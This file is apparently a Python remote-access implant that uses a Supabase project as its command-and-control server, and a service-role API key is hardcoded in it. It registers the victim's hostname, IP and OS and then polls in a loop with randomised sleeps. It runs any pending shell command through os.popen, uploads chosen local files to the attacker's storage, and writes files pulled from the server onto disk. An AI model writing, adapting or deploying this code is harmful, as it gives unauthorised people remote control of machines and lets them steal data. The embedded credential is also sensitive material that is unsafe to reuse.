import os
import time
import random
import socket
import platform
import requests
from datetime import datetime
from supabase import create_client, Client
import mimetypes

# Initialize Supabase client with your project's URL and API key
SUPABASE_URL = "https://aegfzwdrslyhgsugoecw.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFlZ2Z6d2Ryc2x5aGdzdWdvZWN3Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTcxNTI5NDM3MiwiZXhwIjoyMDMwODcwMzcyfQ.F_8dfPIk60brW4ZLXcBCph45KOe6jEUdSZHEikJuqhs"
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

DEFAULT_TIMEOUT = 30  # Default timeout value if not provided
DEFAULT_CHECK_IN = 'Checked-in'  # Default check-in status if not provided
bucket_name = "files"

def get_system_info():
    """Retrieve the hostname, IP address, and OS of the current system."""
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    os_info = platform.system() + " " + platform.release()
    return hostname, ip, os_info

def fetch_settings():
    """Fetch the system settings from the settings table, or return default values."""
    hostname, ip, os_info = get_system_info()
    response = supabase.table('settings').select('*').eq('hostname', hostname).limit(1).execute()
    settings_data = response.data

    now = datetime.utcnow().isoformat() + "Z"  # Timestamp in UTC format

    if settings_data:
        settings = settings_data[0]
        timeout_interval = settings.get('timeout_interval', DEFAULT_TIMEOUT)
        check_in_status = settings.get('check_in', DEFAULT_CHECK_IN)

        # Update the last checked-in time
        supabase.table('settings').update({
            'last_checked_in': now
        }).eq('hostname', hostname).execute()

        return timeout_interval, check_in_status
    else:
        # Insert new system info if no record exists for this hostname
        supabase.table('settings').insert({
            'hostname': hostname,
            'ip': ip,
            'os': os_info,
            'timeout_interval': DEFAULT_TIMEOUT,
            'check_in': DEFAULT_CHECK_IN,
            'last_checked_in': now
        }).execute()

    return DEFAULT_TIMEOUT, DEFAULT_CHECK_IN

def fetch_pending_commands_for_hostname(hostname):
    """Fetch commands with status 'Pending' and a specific hostname."""
    return supabase.table('py2').select('*').eq('status', 'Pending').eq('hostname', hostname).execute()

def update_command_status(command_id, status, output='', hostname='', ip='', os=''):
    """Update the status, output, and system info of a command."""
    supabase.table('py2').update({
        'status': status,
        'output': output,
        'hostname': hostname,
        'ip': ip,
        'os': os
    }).eq('id', command_id).execute()

def handle_download_command(command_text):
    """Handle the 'download' command by uploading the file to Supabase storage."""
    try:
        _, file_path = command_text.split(maxsplit=1)

        # Input validation
        if not os.path.exists(file_path):
            return "Failed", f"File does not exist: {file_path}"

        # Determine MIME type (optional but recommended)
        mimetype, _ = mimetypes.guess_type(file_path)
        if not mimetype:
            mimetype = "application/octet-stream"

        file_name = os.path.basename(file_path)

        # Upload the file
        with open(file_path, "rb") as f:
            response = supabase.storage.from_(bucket_name).upload(
                file_name, f, file_options={"content_type": mimetype}
            )

            # Check if the upload was successful
            if response.status_code == 200 or response.status_code == 201:
                # Successful HTTP status for uploads
                print(f"File '{file_name}' uploaded to your storage successfully.")
            else:
                # Failed upload, try to parse error message from response
                error_data = response.json()
                error_message = error_data.get("error", {}).get("message", "Unknown error")
                return "Failed", f"Upload failed: {error_message}"

        return "Completed", f"File '{file_name}' uploaded to your storage."

    except Exception as e:
        print(f"Error in handle_download_command: {e}")
        return "Failed", str(e)

def get_public_url(bucket_name, file_path):
    """Constructs the public URL for a file in Supabase storage."""
    return f"https://{SUPABASE_URL.split('//')[1]}/storage/v1/object/{bucket_name}/{file_path}"

def download_from_supabase(file_url, remote_path, supabase_key):  
    """Downloads a file from Supabase storage using the API with authentication and saves it to the specified path."""
    headers = {
        'apikey': supabase_key,
        'Authorization': f'Bearer {supabase_key}'
    }

    local_directory = os.path.dirname(remote_path)
    if local_directory and not os.path.exists(local_directory):
        os.makedirs(local_directory, exist_ok=True)

    response = requests.get(file_url, headers=headers)
    if response.status_code == 200:
        with open(remote_path, 'wb') as file:
            file.write(response.content)
        print(f"Download successful, file saved to {remote_path}")
        return True
    else:
        print(f"Failed to download file: {response.status_code} - {response.reason}")
        return False

def fetch_pending_uploads():
    """Fetches pending uploads from the 'uploads' table."""
    return supabase.table("uploads").select("*").eq("status", "pending").execute()


def handle_upload_command(command_text, encoded_data):
    """Handle the 'upload' command by decoding and writing the file to the specified path."""
    try:
        _, remote_path = command_text.split(maxsplit=2)[1:]
        file_data = base64.b64decode(encoded_data)
        with open(remote_path, 'wb') as f:
            f.write(file_data)
        return 'Completed', f"File uploaded to '{remote_path}'"
    except Exception as e:
        return 'Failed', str(e)

def execute_commands():
    hostname, ip, os_info = get_system_info()
    pending_uploads = fetch_pending_uploads().data
    for upload in pending_uploads:
        file_url = upload.get('file_url')
        remote_path = upload.get('remote_path')

        if file_url and remote_path:
            print(f"[DEBUG] Downloading {file_url} to {remote_path} on {hostname}")
            if download_from_supabase(file_url, remote_path, SUPABASE_KEY):
                supabase.table("uploads").update({"status": "completed"}).eq("id", upload['id']).execute()
                print(f"[SUCCESS] Downloaded {file_url} to {remote_path} on {hostname}")
            else:
                supabase.table("uploads").update({"status": "failed"}).eq("id", upload['id']).execute()
                print(f"[ERROR] Failed to download {file_url} to {remote_path} on {hostname}")


    # --- 2. Handle Other Commands ---
    pending_commands = fetch_pending_commands_for_hostname(hostname).data
    for command in pending_commands:
        command_id = command['id']
        command_text = command['command']
        encoded_data = command.get('output', '')  # Fetch encoded data for upload commands

        if command_text.lower().startswith('download'):
            status, output = handle_download_command(command_text)
        elif command_text.lower().startswith('upload'):
            status, output = handle_upload_command(command_text, encoded_data) # Pass encoded data to handle_upload_command
        else:
            try:
                print(f"[DEBUG] Executing command '{command_text}' on {hostname}")
                result = os.popen(command_text).read()
                status = 'Completed'
                output = result
                print(f"[SUCCESS] Command '{command_text}' executed on {hostname}")  
            except Exception as e:
                status = 'Failed'
                output = str(e)
                print(f"[ERROR] Command '{command_text}' failed on {hostname}: {e}")

        update_command_status(command_id, status, output, hostname, ip, os_info)




if __name__ == '__main__':
    while True:
        timeout_interval, _ = fetch_settings()
        execute_commands()
        interval = random.randint(1, timeout_interval)
        print(f"Sleeping for {interval} seconds.")
        time.sleep(interval)
